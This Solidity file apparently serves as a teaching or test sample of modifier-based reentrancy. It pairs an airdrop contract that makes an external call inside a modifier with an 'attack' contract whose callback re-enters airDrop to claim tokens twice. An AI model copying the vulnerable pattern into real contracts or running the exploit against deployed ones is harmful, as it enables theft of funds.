pragma solidity ^0.4.24;

contract ModifierEntrancy {
  mapping (address => uint) public tokenBalance;
  string constant name = "Nu Token";

  function airDrop() hasNoBalance supportsToken public {
    tokenBalance[msg.sender] += 20;
  }

  modifier supportsToken() {
    require(Bank(msg.sender).supportsToken() == keccak256(abi.encodePacked("Nu Token")));
    _;
  }

  modifier hasNoBalance {
    require(tokenBalance[msg.sender] == 0);
    _;
  }
}

contract Bank {
    function supportsToken() external pure returns(bytes32) {
        return keccak256(abi.encodePacked("Nu Token"));
    }
}

contract attack {  
    bool hasBeenCalled;
    function supportsToken() external returns(bytes32) {
        if (!hasBeenCalled) {
            ModifierEntrancy(msg.sender).airDrop();
            hasBeenCalled = true;
        }
        return keccak256(abi.encodePacked("Nu Token"));
    }
    function call(address token) public {
        ModifierEntrancy(token).airDrop();
    }
}